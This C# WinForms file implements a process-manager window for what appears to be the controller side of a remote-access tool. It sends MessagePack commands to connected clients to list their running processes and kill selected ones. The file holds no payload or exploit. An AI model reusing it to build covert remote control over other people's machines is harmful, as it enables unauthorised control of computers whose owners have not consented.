using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Server.MessagePack;
using Server.Connection;

namespace Server.Forms
{
    public partial class FormProcessManager : Form
    {
        public Form1 F { get; set; }
        internal Clients Client { get; set; }
        internal Clients ParentClient { get; set; }

        public FormProcessManager()
        {
            InitializeComponent();
        }


        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!Client.TcpClient.Connected || !ParentClient.TcpClient.Connected) this.Close();
            }
            catch { this.Close(); }
        }

        private async void killToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                foreach (ListViewItem P in listView1.SelectedItems)
                {
                    await Task.Run(() =>
                    {
                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "processManager";
                        msgpack.ForcePathObject("Option").AsString = "Kill";
                        msgpack.ForcePathObject("ID").AsString = P.SubItems[lv_id.Index].Text;
                        ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                    });
                }
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ThreadPool.QueueUserWorkItem((o) =>
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "processManager";
                msgpack.ForcePathObject("Option").AsString = "List";
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            });
        }

        private void FormProcessManager_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                ThreadPool.QueueUserWorkItem((o) =>
                {
                    Client?.Disconnected();
                });
            }
            catch { }
        }
    }
}
